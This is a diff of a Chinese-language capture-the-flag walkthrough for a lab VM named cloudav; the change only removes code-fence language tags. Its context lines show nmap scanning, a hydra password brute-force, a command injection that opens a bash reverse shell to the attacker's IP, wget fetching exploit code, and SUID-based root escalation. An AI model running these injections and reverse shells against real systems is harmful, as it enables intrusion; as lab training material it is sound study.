@@ -14,7 +14,7 @@
 
 `ifconfig` 获取攻击机的 ip 为 `10.0.2.3`，使用 `nmap` 扫描 ip：
 
-```yacas
+```
 > nmap -sn 10.0.2.0/24
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-22 14:03 CST
 Nmap scan report for 10.0.2.1
@@ -33,7 +33,7 @@ Nmap done: 256 IP addresses (4 hosts up) scanned in 2.18 seconds
 
 考虑靶机 ip 为 `10.0.2.4`，继续扫描端口 `nmap -sV -sC 10.0.2.4`，看看有哪些服务项
 
-```yacas
+```
 > nmap -sV -sC 10.0.2.4
 Starting Nmap 7.95 ( nmap.org ) at 2025-10-22 14:03 CST
 Nmap scan report for 10.0.2.4
@@ -75,7 +75,7 @@ Nmap done: 1 IP address (1 host up) scanned in 8.13 seconds
 
 BurpSuite 抓包发现为 http-post 请求，Request body parameters 为 `password=114`，输入错误的邀请码返回 `WRONG INFORMATION`，并且表单的 HTTP 参数为 `<form action="/login" method="POST">`，据此进行爆破：
 
-```yacas
+```
 > hydra -l "" -P /usr/share/wordlists/nmap.lst 10.0.2.4 -s 8080 http-post-form "/login:password=^PASS^:WRONG INFORMATION" -f
 
 Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
@@ -107,7 +107,7 @@ File Name 填了一个 `cat`，Scan 一下试试
 
 发现这个不行，又换了一个 `hello | echo 'bash -i >& /dev/tcp/10.0.2.3/1234 0>&1' | bash`
 
-```yacas
+```
 > nc -lvp 1234
 listening on [any] 1234 ...
 Warning: forward host lookup failed for bogon: Unknown host
@@ -125,7 +125,7 @@ scanner@cloudav:~/cloudav_app$
 
 先无脑尝试内核提权，确认一下内核版本
 
-```yacas
+```
 scanner@cloudav:~/cloudav_app$ uname -a 
 uname -a
 Linux cloudav 4.15.0-36-generic #39-Ubuntu SMP Mon Sep 24 16:19:09 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
@@ -141,7 +141,7 @@ Codename:       bionic
 
 照例进行 `searchsploit`：
 
-```yacas
+```
 > searchsploit Linux 4.15
 -------------------------------------------------------------- ---------------------------------
  Exploit Title                                                |  Path
@@ -165,7 +165,7 @@ Linux Kernel < 4.17-rc1 - 'AF_LLC' Double Free                | linux/dos/44579.
 
 选择 `50135.c` ，发现失败
 
-```yacas
+```
 scanner@cloudav:~/cloudav_app$ cd /tmp                   
 cd /tmp
 scanner@cloudav:/tmp$ wget 10.0.2.3:1145/50135.c
@@ -208,7 +208,7 @@ scanner@cloudav:/tmp$
 
 扫一遍 suid 文件
 
-```yacas
+```
 scanner@cloudav:~/cloudav_app$ find / -perm -4000 -type f 2>/dev/null
 find / -perm -4000 -type f 2>/dev/null
 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
@@ -287,7 +287,7 @@ return 0;
 
 这个程序直接以 root 权限处理用户输入，直接运行：`./update_cloudav "/bin/sh"` 
 
-```yacas
+```
 scanner@cloudav:~$ ./update_cloudav "/bin/sh"
 ./update_cloudav "/bin/sh"
 ERROR: Problem with internal logger (UpdateLogFile = /var/log/clamav/freshclam.log).
